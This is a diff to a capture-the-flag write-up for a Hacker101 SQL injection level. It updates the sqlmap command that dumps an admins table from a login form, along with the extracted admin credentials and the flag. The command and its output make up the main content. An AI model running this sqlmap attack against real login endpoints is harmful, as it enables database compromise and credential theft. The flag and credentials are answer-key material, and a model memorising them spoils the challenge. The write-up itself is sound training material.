@@ -161,12 +161,13 @@ I navigated to the previously forbidden `/page/edit/3` endpoint and discovered t
 SQLMap is a powerful automated SQL injection tool. Here's a breakdown of the command used:
 
 ```bash
-sqlmap -u https://4eaf579a76255142ee4a5e79d0455be4.ctf.hacker101.com/login \
+sqlmap -u https://250eb653c2012f2e5b4357cf4d0a9e68.ctf.hacker101.com/login \
        --data "username=abc&password=xyz" \
        -p username \
        --dbms=mysql \
-       --dump \
-       --threads 10
+       -D level2 -T admins \
+       --batch \
+       --dump
 ```
 
 **Parameter Breakdown:**
@@ -177,12 +178,14 @@ sqlmap -u https://4eaf579a76255142ee4a5e79d0455be4.ctf.hacker101.com/login \
 | `--data` | POST data | Defines the form parameters to test |
 | `-p username` | Parameter to test | Focuses testing on the username parameter |
 | `--dbms=mysql` | Database type | Optimizes payloads for MySQL database |
+| `-D level2 -T admins` | Target Scope | Directs extraction specifically to the admins table within the level2 database |
+| `--batch` | Automation | Automatically answers 'yes' to all prompts, running non-interactively |
 | `--dump` | Extract data | Downloads all discoverable database content |
-| `--threads 10` | Concurrency | Uses 10 parallel threads for faster execution |
+
 
 ### Automated Exploitation
 
-SQLMap automatically detected and exploited the SQL injection vulnerability, then proceeded to dump the entire database structure and contents.
+SQLMap automatically detected and exploited the SQL injection vulnerability, then directly targeted the admin table to dump the required credentials.
 
 ### Database Discovery
 
@@ -190,17 +193,17 @@ The tool successfully extracted the admin credentials table:
 
 ```csv
 id,password,username
-1,paulina,mariko
+1,madalene,harris
 ```
 
 **Analysis:**
-- **Username:** `mariko`
-- **Password:** `paulina`
+- **Username:** `harris`
+- **Password:** `madalene`
 - These are the legitimate admin credentials stored in the database
 
 ### 🏁 Third Flag Captured
 ```
-^FLAG^d9dcb4242ec8c65b84f35754ffce7ab9e646f0d776dbb87d2cf33e7fafebf765$FLAG$
+^FLAG^4744726c189edf4d568ee9d5971079876bc9223759e0ba8c6aca5e51f0d67d37$FLAG$
 ```
 
 **Vulnerability:** Complete database compromise through automated SQL injection.
